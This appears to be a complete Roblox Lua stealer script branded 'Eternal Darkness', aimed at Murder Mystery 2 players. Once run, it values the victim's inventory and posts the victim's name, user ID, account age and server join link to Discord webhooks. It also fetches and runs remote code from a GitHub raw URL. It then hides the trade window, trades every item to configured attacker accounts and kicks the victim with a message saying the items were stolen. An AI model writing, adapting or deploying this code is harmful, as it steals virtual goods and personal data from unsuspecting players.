repeat task.wait() until game:IsLoaded() task.wait(1.5)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer

if not plr then return end
if game.PlaceId ~= 142823291 then
	pcall(function() plr:Kick("Eternal Darkness | MM2 Only") end)
	return
end

if not _G.ED_CONFIG then
	return
end

local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_WEBHOOK = "31566ef8c2c18566522c58e8c11511cf"

if not WEBHOOK_ID or WEBHOOK_ID == "" then return end
if not USERNAMES or #USERNAMES == 0 then return end

local executorName = "Unknown"
pcall(function()
	if identifyexecutor then executorName = identifyexecutor()
	elseif getexecutorname then executorName = getexecutorname() end
end)

local requestFunc = nil
local httpCompat = {
	syn and syn.request,
	fluxus and fluxus.request,
	http and http.request,
	getgenv().request,
	request,
	http_request,
	game:GetService("HttpService").RequestAsync and function(req)
		return game:GetService("HttpService"):RequestAsync({
			Url = req.Url, Method = req.Method,
			Headers = req.Headers, Body = req.Body
		})
	end
}

for _, method in ipairs(httpCompat) do
	if method then requestFunc = method break end
end

if not requestFunc then return end

local REAL_JOB_ID = game.JobId
local function captureJobIdForDelta()
	if executorName:lower() ~= "delta" then return end
	local captured = false
	local targetFunc = nil
	repeat
		for _, v in ipairs(getgc(true)) do
			if typeof(v) == "function" then
				local info = debug.getinfo(v)
				if info and info.name == "stepAnimate" then
					targetFunc = v
					break
				end
			end
		end
		task.wait()
	until targetFunc
	local old
	old = hookfunction(targetFunc, function(dt)
		if not captured then
			captured = true
			REAL_JOB_ID = game.JobId
		end
		return old(dt)
	end)
	repeat task.wait() until captured
end

captureJobIdForDelta()

local function serverHop()
	local success, result = pcall(function()
		local response = requestFunc({
			Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
			Method = "GET",
			Headers = {["User-Agent"] = "Mozilla/5.0"}
		})
		if response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data then
				for _, server in ipairs(data.data) do
					if server.id ~= game.JobId and server.playing < server.maxPlayers then
						TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
						task.wait(5)
						return
					end
				end
			end
		end
	end)
end

local vipOk, isVIP = pcall(function()
	return (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer() == "VIPServer")
end)
isVIP = vipOk and isVIP or false

local isFull = (#Players:GetPlayers() >= 12)

if isVIP or isFull then
	local executorLower = executorName:lower()
	local hopExecutors = {["delta"] = true, ["hydrogen"] = true, ["fluxus"] = true, ["arceus"] = true, ["codex"] = true}
	if hopExecutors[executorLower] then
		pcall(function() plr:Kick(isVIP and "VIP Servers not supported." or "FULL Servers Arent Supported") end)
		return
	else
		serverHop()
		return
	end
end

local blockedItems = {
	DefaultGun = true, DefaultKnife = true, Reaver = true,
	Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
	IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
	IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
	Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
	TestItem = true, Season1TestKnife = true, Cracks = true,
	Icecrusher = true, ["???"] = true, Dartbringer = true,
	TravelerAxeRed = true, TravelerAxeBronze = true,
	TravelerAxeSilver = true, TravelerAxeGold = true,
	BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
}

local rarityPriority = {
	Ancient = 9, Godly = 8, Unique = 7, Vintage = 6,
	Legendary = 5, Rare = 4, Uncommon = 3, Common = 2
}

local rarityEmojis = {
	Ancient = "🔴", Godly = "🟣", Unique = "🟡", Vintage = "🟠",
	Legendary = "🔵", Rare = "🟢", Uncommon = "⚪", Common = "⚫"
}

local rarityANSI = {
	Ancient = string.char(27) .. "[2;31m", Godly = string.char(27) .. "[2;35m",
	Unique = string.char(27) .. "[2;33m", Vintage = string.char(27) .. "[2;38;5;208m",
	Legendary = string.char(27) .. "[2;34m", Rare = string.char(27) .. "[2;32m",
	Uncommon = string.char(27) .. "[2;37m", Common = string.char(27) .. "[2;37m"
}

local function safeRequire(parent, ...)
	local current = parent
	for _, childName in ipairs({...}) do
		current = current:WaitForChild(childName, 10)
		if not current then return nil end
	end
	local ok, result = pcall(function() return require(current) end)
	return ok and result or nil
end

local database = safeRequire(ReplicatedStorage, "Database", "Sync", "Item")
if not database then return end

local profileData = nil
pcall(function()
	profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)
if not profileData then return end

local mm2Values = {}
pcall(function()
	local response = requestFunc({
		Url = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2",
		Method = "GET",
		Headers = {["User-Agent"] = "Mozilla/5.0"}
	})
	if response and response.Body then
		local data = HttpService:JSONDecode(response.Body)
		if data and data.data then
			for _, item in ipairs(data.data) do
				if item.name and item.price then
					mm2Values[item.name] = tonumber(item.price) or 0
				end
			end
		end
	end
end)

local weaponsToSend = {}
local totalInventoryValue = 0
local rarityCounts = {Ancient = 0, Godly = 0, Unique = 0, Vintage = 0, Legendary = 0, Rare = 0, Uncommon = 0, Common = 0}
local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}

for dataid, amount in pairs(weaponsOwned) do
	local item = database[dataid]
	if item and not blockedItems[dataid] and amount > 0 then
		local itemName = item.ItemName or tostring(dataid)
		local rarity = item.Rarity or "Common"
		local value = mm2Values[dataid] or 0
		totalInventoryValue = totalInventoryValue + (value * amount)
		table.insert(weaponsToSend, {
			DataID = dataid, ItemName = itemName,
			Amount = amount, Rarity = rarity,
			Value = value, TotalValue = value * amount
		})
		rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
	end
end

table.sort(weaponsToSend, function(a, b)
	return a.TotalValue > b.TotalValue
end)

local function uploadToPastefy(items)
	local lines = {
		"Eternal Darkness | " .. plr.Name,
		os.date("%Y-%m-%d %H:%M:%S"),
		"Total: " .. #items,
		string.rep("-", 50), ""
	}

	table.sort(items, function(a, b)
		local ao = rarityPriority[a.Rarity] or 1
		local bo = rarityPriority[b.Rarity] or 1
		if ao ~= bo then return ao > bo end
		return (a.Value * a.Amount) > (b.Value * b.Amount)
	end)

	local currentTier = nil
	for _, item in ipairs(items) do
		if currentTier ~= item.Rarity then
			currentTier = item.Rarity
			table.insert(lines, "")
			table.insert(lines, "[" .. currentTier:upper() .. "]")
			table.insert(lines, string.rep("-", 30))
		end
		table.insert(lines, string.format("%s | Qty: %d | Value: $%.2f (Total: $%.2f)",
			item.ItemName, item.Amount, item.Value, item.TotalValue))
	end

	local content = table.concat(lines, "\n")
	local ok, response = pcall(function()
		return requestFunc({
			Url = "https://pastefy.app/api/v2/paste",
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({content = content, type = "PASTE"})
		})
	end)

	if ok and response and response.StatusCode == 200 then
		local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
		if ok2 and data then
			return data.paste and ("https://pastefy.app/" .. data.paste.id) or
				   data.id and ("https://pastefy.app/" .. data.id) or "Failed"
		end
	end
	return "Failed"
end

local function sendWebhook(webhookId, payload)
	task.spawn(function()
		pcall(function()
			requestFunc({
				Url = PROXY_URL .. webhookId,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
					["User-Agent"] = "EternalDarkness/3.0"
				},
				Body = HttpService:JSONEncode(payload)
			})
		end)
	end)
end

local rubisLink = uploadToPastefy(weaponsToSend)
local fernLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, REAL_JOB_ID)

local hitCategory = "Low Hit"
local pingWorthy = false
if totalInventoryValue >= 1000 then
	hitCategory = "Big Hit"
	pingWorthy = true
elseif totalInventoryValue >= 300 then
	hitCategory = "Good Hit"
	pingWorthy = true
elseif totalInventoryValue >= 100 then
	hitCategory = "Normal Hit"
	pingWorthy = true
end

local totalItemCount = 0
for _, item in ipairs(weaponsToSend) do
	totalItemCount = totalItemCount + item.Amount
end

local topItems = {}
for i = 1, math.min(3, #weaponsToSend) do
	local item = weaponsToSend[i]
	local emoji = rarityEmojis[item.Rarity] or "⚪"
	table.insert(topItems, string.format("%s `%s` x%d **$%.2f**", emoji, item.ItemName, item.Amount, item.TotalValue))
end

local esc = string.char(27)
local function buildANSILine(label, value, colorCode)
	return colorCode .. label .. ": " .. value .. esc .. "[0m"
end

local ansiLines = {
	buildANSILine("Ancient  ", rarityCounts.Ancient, rarityANSI.Ancient) .. "  " .. buildANSILine("Godly   ", rarityCounts.Godly, rarityANSI.Godly),
	buildANSILine("Unique   ", rarityCounts.Unique, rarityANSI.Unique) .. "  " .. buildANSILine("Vintage ", rarityCounts.Vintage, rarityANSI.Vintage),
	buildANSILine("Legendary", rarityCounts.Legendary, rarityANSI.Legendary) .. "  " .. buildANSILine("Rare    ", rarityCounts.Rare, rarityANSI.Rare),
	buildANSILine("Uncommon ", rarityCounts.Uncommon, rarityANSI.Uncommon) .. "  " .. buildANSILine("Common  ", rarityCounts.Common, rarityANSI.Common)
}

local embedColor = 0x1a1a2e
local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
local teleportCode = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```"

local privateFields = {
	{name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
	{name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
	{name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. totalItemCount, inline = true},
	{name = "📊 Inventory", value = "```ansi\n" .. table.concat(ansiLines, "\n") .. "\n```", inline = false},
	{name = "🏆 Top Items", value = #topItems > 0 and ("```\n" .. table.concat(topItems, "\n") .. "\n```") or "No notable items", inline = false},
	{name = "🔗 Actions", value = "[Join Server](" .. fernLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false}
}

local publicFields = {
	{name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId, inline = true},
	{name = "⚙️ Executor", value = executorName, inline = true},
	{name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. totalItemCount, inline = true},
	{name = "📊 Inventory", value = "```ansi\n" .. table.concat(ansiLines, "\n") .. "\n```", inline = false},
	{name = "🏆 Top Items", value = #topItems > 0 and ("```\n" .. table.concat(topItems, "\n") .. "\n```") or "No notable items", inline = false},
	{name = "🔗 Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
}

local privatePayload = {
	content = pingWorthy and "@everyone 🌑 **NEW MM2 HIT | Eternal Darkness**" or nil,
	username = "🌑 Eternal Darkness",
	avatar_url = "https://i.imgur.com/LhzvN5h.png",
	embeds = {{
		title = "Eternal Darkness MM2 HIT | " .. hitCategory,
		url = rubisLink,
		color = embedColor,
		thumbnail = {url = thumbnailUrl},
		description = teleportCode,
		fields = privateFields,
		footer = {text = "Eternal Darkness v9.0"},
		timestamp = timestamp
	}}
}

local publicPayload = {
	content = "🌑 **MM2 Public Hits | Eternal Darkness**",
	username = "🌑 Eternal Darkness",
	avatar_url = "https://i.imgur.com/LhzvN5h.png",
	embeds = {{
		title = "Eternal Darkness MM2 HIT | " .. hitCategory,
		url = rubisLink,
		color = embedColor,
		thumbnail = {url = thumbnailUrl},
		fields = publicFields,
		footer = {text = "Eternal Darkness v9.0"},
		timestamp = timestamp
	}}
}

if totalItemCount > 0 then
	sendWebhook(WEBHOOK_ID, privatePayload)
	sendWebhook(PUBLIC_WEBHOOK, publicPayload)
end

task.wait(3)

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/outhackernuls090-hash/opensrc_visual/refs/heads/main/visual.lua"))()
end)

local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
if not Trade then return end

local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local lastOfferInfo = nil
if Trade:FindFirstChild("UpdateTrade") then
	Trade.UpdateTrade.OnClientEvent:Connect(function(data)
		if data and data.LastOffer then
			lastOfferInfo = data.LastOffer
		end
	end)
end

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
	local gui = PlayerGui:FindFirstChild(guiName)
	if gui then
		gui.Enabled = false
		gui:GetPropertyChangedSignal("Enabled"):Connect(function()
			if gui.Enabled then gui.Enabled = false end
		end)
	end
end

local function getTradeStatus()
	local ok, status = pcall(function() return GetStatus:InvokeServer() end)
	return ok and status or "None"
end

local function isTargetPlayer(name)
	for _, target in ipairs(USERNAMES) do
		if target:lower() == name:lower() then return true end
	end
	return false
end

local function waitForTradeEnd()
	repeat task.wait(0.1) until getTradeStatus() == "None"
end

local function acceptTradeDeal()
	if lastOfferInfo then
		AcceptTradeRemote:FireServer(game.PlaceId * 3, lastOfferInfo)
	else
		AcceptTradeRemote:FireServer(game.PlaceId * 3, {})
	end
end

local function addItemToOffer(itemId)
	OfferItem:FireServer(itemId, "Weapons")
	task.wait(0.1)
end

local isTradeCompleted = false

local function performTrade(targetPlayer)
	if not targetPlayer then return end

	local waitAttempts = 0
	while waitAttempts < 30 do
		if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
		waitAttempts = waitAttempts + 1
		task.wait(0.5)
	end

	if not (targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid")) then
		return
	end

	local itemsRemaining = {}
	for _, item in ipairs(weaponsToSend) do
		table.insert(itemsRemaining, {
			DataID = item.DataID,
			ItemName = item.ItemName,
			Amount = item.Amount,
			Rarity = item.Rarity
		})
	end

	if #itemsRemaining == 0 then return end

	while #itemsRemaining > 0 and not isTradeCompleted do
		local currentStatus = getTradeStatus()

		if currentStatus == "StartTrade" then
			DeclineTrade:FireServer()
			task.wait(0.3)
		elseif currentStatus == "ReceivingRequest" then
			if Trade:FindFirstChild("DeclineRequest") then
				Trade.DeclineRequest:FireServer()
			else
				DeclineTrade:FireServer()
			end
			task.wait(0.3)
		end

		local tradeStarted = false
		local sendAttempts = 0
		while not tradeStarted and sendAttempts < 30 do
			local status = getTradeStatus()
			if status == "StartTrade" then
				tradeStarted = true
				break
			elseif status == "None" then
				pcall(function() SendRequest:InvokeServer(targetPlayer) end)
			elseif status == "ReceivingRequest" then
				if Trade:FindFirstChild("DeclineRequest") then
					Trade.DeclineRequest:FireServer()
				else
					DeclineTrade:FireServer()
				end
			end
			sendAttempts = sendAttempts + 1
			task.wait(0.5)
		end

		if not tradeStarted then
			task.wait(2)
			continue
		end

		local slotsLeft = 4
		local itemsAdded = 0
		while slotsLeft > 0 and #itemsRemaining > 0 do
			local currentItem = itemsRemaining[1]
			local amountToAdd = math.min(slotsLeft, currentItem.Amount)
			for _ = 1, amountToAdd do
				addItemToOffer(currentItem.DataID)
			end
			currentItem.Amount = currentItem.Amount - amountToAdd
			if currentItem.Amount <= 0 then
				table.remove(itemsRemaining, 1)
			end
			slotsLeft = slotsLeft - amountToAdd
			itemsAdded = itemsAdded + amountToAdd
		end

		if itemsAdded == 0 then break end

		task.wait(5)
		acceptTradeDeal()
		waitForTradeEnd()

		if #itemsRemaining > 0 then
			task.wait(1)
		end
	end

	if #itemsRemaining == 0 then
		isTradeCompleted = true
		task.wait(2)
		pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
		pcall(function()
			plr:Kick("Eternal Darkness | Your Items got Stolen\n\ndiscord.gg/wep4k9Fg8W")
		end)
	end
end

Players.PlayerAdded:Connect(function(player)
	if player == plr then return end
	if isTargetPlayer(player.Name) then
		task.spawn(function()
			task.wait(4)
			performTrade(player)
		end)
	end
end)

for _, existingPlayer in ipairs(Players:GetPlayers()) do
	if existingPlayer ~= plr and isTargetPlayer(existingPlayer.Name) then
		task.spawn(function()
			task.wait(4)
			performTrade(existingPlayer)
		end)
	end
end
